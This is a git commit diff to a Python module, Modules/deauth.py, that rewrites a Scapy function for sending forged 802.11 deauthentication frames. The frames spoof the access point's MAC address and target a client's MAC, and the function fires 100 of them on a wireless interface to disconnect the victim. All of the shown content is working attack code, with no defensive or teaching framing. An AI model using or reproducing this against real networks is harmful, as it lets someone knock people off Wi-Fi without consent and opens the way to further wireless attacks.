d29669baf5998a5b131d770f71264ec1cb311a6c
Ian Sandi <ian.tayler.sandi@gmail.com>
2025-10-20 02:05:57 -0600

    ...

--- Modules/deauth.py
+++ Modules/deauth.py
@@ -11,16 +11,13 @@ def run(cmd):
         time.sleep(5)
 
 
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="Wi-Fi 7", verbose=1):
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    # stack them up
-    deauth_packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-    # send the packet
-    sendp(deauth_packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
+def deauth(target_mac, gateway_mac):
+    packet = RadioTap() / Dot11(addr1=target_mac,
+                                addr2=gateway_mac,
+                                addr3=gateway_mac) / Dot11Deauth(reason=7)
+    sendp(packet, inter=0.01,
+          count=100, iface="wlan0",
+          verbose=1)
     print("Deauthing...")
 
 run(deauth)
